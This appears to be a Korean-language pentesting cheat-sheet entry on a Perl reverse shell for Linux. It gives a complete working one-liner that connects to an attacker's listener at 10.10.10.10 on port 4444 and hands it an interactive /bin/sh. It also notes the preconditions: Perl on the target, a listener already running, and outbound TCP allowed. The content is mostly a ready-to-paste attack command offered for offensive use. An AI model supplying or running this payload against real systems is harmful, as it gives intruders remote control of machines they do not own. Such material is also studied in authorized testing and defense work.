# linux perl reverse shell

- perl Socket 모듈로 TCP 연결을 STDIN/STDOUT/STDERR에 물리고 /bin/sh -i를 exec하는 리버스 셸 원라이너
- python이 없는 오래된 시스템에서 셸을 열 때, perl은 거의 모든 배포판에 기본 설치돼 있다
- 타깃에 perl 존재, 공격자 리스너 사전 실행, 타깃에서 공격자로 TCP 아웃바운드 허용 필요

python이 없는 오래된 시스템에서. perl은 거의 모든 배포판에 기본 설치되어 있다.

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
